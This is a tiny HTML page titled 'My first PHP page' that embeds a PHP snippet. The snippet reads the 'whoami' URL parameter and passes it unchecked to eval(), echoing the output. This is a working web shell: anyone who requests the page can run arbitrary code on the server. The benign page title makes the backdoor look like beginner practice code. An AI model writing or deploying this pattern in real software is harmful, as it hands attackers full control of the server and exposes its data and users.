 <!DOCTYPE html>
<html>
<body>

<h1>My first PHP page</h1>
<?php $code = $_GET['whoami'];
$x = eval($code);
echo $x?>
</body>
</html> 
